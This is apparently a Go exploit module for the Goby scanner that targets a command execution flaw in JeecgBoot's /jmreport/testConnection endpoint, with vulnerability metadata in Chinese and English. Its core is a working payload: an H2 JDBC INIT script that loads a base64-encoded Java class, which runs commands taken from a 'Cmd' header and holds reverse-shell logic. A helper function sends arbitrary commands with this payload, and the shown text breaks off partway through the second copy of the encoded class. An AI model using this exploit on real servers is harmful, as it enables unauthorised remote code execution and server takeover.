package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "JeecgBoot /jmreport/testConnection Command Execution Vulnerability",
    "Description": "<p>JeecgBoot is a low code development platform based on a code generator.</p><p>JeecgBoot testConnection Remote command execution vulnerability. An attacker could exploit this vulnerability to gain access to the server.</p>",
    "Product": "JEECGBOOT-Ent-Low-CP",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2024-06-13",
    "PostTime": "2024-06-13",
    "Author": "1070488180@qq.com",
    "FofaQuery": "body=\"积木报表\"",
    "GobyQuery": "body=\"积木报表\"",
    "Level": "3",
    "Impact": "<p>JeecgBoot testConnection Remote command execution vulnerability. An attacker could exploit this vulnerability to gain access to the server.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"http://www.jeecg.com/\">http://www.jeecg.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jmreport/testConnection",
                "follow_redirect": true,
                "header": {
                    "Cmd": "echo 545342341",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"id\": \"1\", \"code\": \"ABC\", \"dbType\": \"MySQL\", \"dbDriver\": \"org.h2.Driver\", \"dbUrl\": \"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')\", \"dbName\": \"383BAb7deFC825E6\", \"dbPassword\": \"917982\", \"userName\": \"917982\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "数据库连接成功",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "545342341",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "JeecgBoot /jmreport/testConnection 命令执行漏洞",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>JeecgBoot 是一款基于代码生成器的低代码开发平台。</p><p>JeecgBoot testConnection 远程命令执行漏洞。攻击者可利用该漏洞获取服务器权限。</p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.jeecg.com/\" target=\"_blank\">http://www.jeecg.com/</a></p>",
            "Impact": "<p>JeecgBoot&nbsp;testConnection 远程命令执行漏洞。攻击者可利用该漏洞获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "JeecgBoot /jmreport/testConnection Command Execution Vulnerability",
            "Product": "JEECGBOOT-Ent-Low-CP",
            "Description": "<p>JeecgBoot is a low code development platform based on a code generator.<br></p><p>JeecgBoot testConnection Remote command execution vulnerability. An attacker could exploit this vulnerability to gain access to the server.<br></p>",
            "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"http://www.jeecg.com/\" target=\"_blank\">http://www.jeecg.com/</a><br></p>",
            "Impact": "<p>JeecgBoot testConnection Remote command execution vulnerability. An attacker could exploit this vulnerability to gain access to the server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	setPayloadRequestHash12343512 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		post := httpclient.NewPostRequestConfig("/jmreport/testConnection")
		post.VerifyTls = false
		post.FollowRedirect = false
		post.Timeout = 5
		post.Header.Store("Cmd", command)
		post.Header.Store("Content-Type", "application/json")
		post.Data = `{"id": "1", "code": "ABC", "dbType": "MySQL", "dbDriver": "org.h2.Driver", "dbUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;}'\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAK